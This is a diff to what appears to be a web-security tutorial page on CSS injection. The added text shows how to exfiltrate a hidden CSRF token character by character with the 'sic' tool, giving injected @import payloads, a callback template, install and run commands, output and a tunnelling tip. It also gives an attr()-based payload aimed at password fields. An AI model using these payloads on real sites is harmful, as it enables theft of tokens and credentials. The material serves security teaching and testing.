@@ -123,17 +123,65 @@ One requirement for this `@import` chain attack is that your input is at the _st
 Explanation of @import chaining
 {% endembed %}
 
+This tool implements the attack and is easy to use:
+
+{% embed url="https://github.com/d0nutptr/sic" %}
+Leak attributes character by character using delayed `@import`s tool
+{% endembed %}
+
+For your injection, you should pass a URL to the `/staging` endpoint of your local port 3000, with a `?len=` parameter being the max length of the value.
+
+<pre class="language-html"><code class="lang-html">&#x3C;input type="hidden" name="csrf" value="SECRET" />
+&#x3C;style>
+<strong>  @import url("http://localhost:3000/staging?len=6");
+</strong>&#x3C;/style>
+</code></pre>
+
+The tool requires a _template_ with `{{:token:}}` and `{{:callback:}}` placeholders to prefix match your target attribute and make a request to the callback. This is to provide flexibility, as in this case, the input is hidden and we need to wrap it with `html:has()`.
+
+{% code title="template.css" %}
+```css
+html:has(input[name="csrf"][value^="{{:token:}}"]) {
+  background: url({{:callback:}});
+}
+```
+{% endcode %}
+
+After your install the tool, set up its arguments and it will host a server on localhost:3000 and localhost:3001, both of which should be accessible to the victim and the external addresses passed as `--ph` and `--ch`:
+
+<pre class="language-shell-session"><code class="lang-shell-session"><strong>$ cargo install https://github.com/d0nutptr/sic.git
+</strong><strong>$ sic -t template.css --ph http://localhost:3000 --ch http://localhost:3001
+</strong>[id: 3712083325] - S
+[id: 3712083325] - SE
+[id: 3712083325] - SEC
+[id: 3712083325] - SECR
+[id: 3712083325] - SECRE
+<strong>[id: 3712083325] - SECRET
+</strong></code></pre>
+
+{% hint style="success" %}
+**Tip**: to make your localhost accessible easily without access to your own domain/VPS, you can set up a free Cloudflare Quick Tunnel which gives you a `https://` subdomain tunneled to your localhost.
+
+{% embed url="https://developers.cloudflare.com/cloudflare-one/connections/connect-networks/do-more-with-tunnels/trycloudflare/" %}
+{% endhint %}
+
 ### One-shot with `attr()`
 
 Due to [a recent update](https://developer.chrome.com/blog/advanced-attr) to the attr() function in CSS, it is possible to get a value of an attribute into a CSS variable. This means it can be used in a function like [`image-set()`](https://developer.mozilla.org/en-US/docs/Web/CSS/image/image-set) to load its value as a relative URL. If the stylesheet was loaded from an attacker's domain, the URL will be relative to the malicious stylesheet's domain:
 
 ```css
-input[name="csrf"] {
+input[name="password"] {
   background: image-set(attr(value))
 }
 ```
 
+> `GET /[leak] HTTP/1.1`
+
 The beauty of this is that it can **leak arbitrarily large attributes all in this single request**. Read more about this find by [@slonser in this tweet](https://web.archive.org/web/20250514150052/https://unrollnow.com/status/1912060407344201738).
+
+{% hint style="warning" %}
+**Note**: while this technique works great for any attributes, `<input type=hidden>` is impossible to leak with this method because such an element cannot have a background, so the request is not made.
+{% endhint %}
 
 ### One-shot using 'contains' operator
 
